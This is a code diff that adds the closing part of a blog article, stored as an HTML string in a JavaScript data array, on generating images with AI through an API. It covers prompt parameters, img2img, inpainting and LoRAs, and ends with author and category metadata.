+      <p>The quality and style of your image depend heavily on the parameters you provide.</p>
+      <ul>
+        <li><strong><code>prompt</code>:</strong> The most important parameter. Be descriptive. Include details about the subject, style, lighting, and composition.</li>
+        <li><strong><code>negative_prompt</code>:</strong> Equally important. Tell the model what to avoid (e.g., "ugly, deformed, extra limbs, blurry, text, watermark").</li>
+        <li><strong><code>width</code> and <code>height</code>:</strong> The dimensions of the output image.</li>
+        <li><strong><code>num_inference_steps</code>:</strong> The number of steps the model takes to "denoise" the image. Higher values (e.g., 50) can lead to more detail but take longer.</li>
+        <li><strong><code>guidance_scale</code> (or <code>cfg_scale</code>):</strong> How strictly the model should adhere to your prompt. A higher value (e.g., 7.5) means stronger adherence.</li>
+        <li><strong><code>seed</code>:</strong> A number that initializes the random generation. Using the same seed with the same prompt will produce the exact same image, which is great for reproducibility.</li>
+      </ul>
+
+      <h3>Chapter 5: Advanced Techniques</h3>
+
+      <h4>Image-to-Image (img2img)</h4>
+      <p>Instead of starting from random noise, you can provide a starting image and a prompt to modify it.</p>
+      <pre><code class="language-javascript">const input = {
+  prompt: "A majestic lion in a snowy forest",
+  image: "https://path.to/your/input-image.jpg", // URL to an initial image
+  prompt_strength: 0.7, // How much to change the original image
+};
+
+const output = await replicate.run("stability-ai/stable-diffusion-3-medium-img2img", { input });</code></pre>
+
+      <h4>Inpainting and Outpainting</h4>
+      <p>These techniques allow you to edit specific parts of an image (inpainting) or extend the canvas (outpainting). You typically provide the original image and a "mask" image, where the white areas of the mask indicate the region to be modified.</p>
+      
+      <h4>Using Custom Models with LoRAs</h4>
+      <p>LoRAs (Low-Rank Adaptations) are small files that can be used to fine-tune a model on a specific style, character, or object. The Replicate API allows you to use community-trained LoRAs to achieve highly specific aesthetics.</p>
+
+      <h3>Conclusion: The Developer's Creative Canvas</h3>
+      <p>Programmatic AI image generation opens up endless possibilities:</p>
+      <ul>
+        <li><strong>Automated Content Creation:</strong> Generate unique blog post headers or social media images automatically.</li>
+        <li><strong>Personalized Avatars:</strong> Create custom avatars for users in your application.</li>
+        <li><strong>Dynamic Game Assets:</strong> Generate unique textures or character concepts on the fly.</li>
+        <li><strong>E-commerce:</strong> Create lifestyle mockups for products.</li>
+      </ul>
+      <p>By mastering the APIs and understanding the key parameters, you can move from being a user of AI tools to a creator of AI-powered applications. Start experimenting with a simple script, and you'll quickly discover the immense creative potential at your fingertips.</p>
+    `,
+    imageUrl: 'https://placehold.co/600x400.png',
+    imageHint: 'ai image generation',
+    author: 'Huzi',
+    category: 'AI',
   }
 ];
 
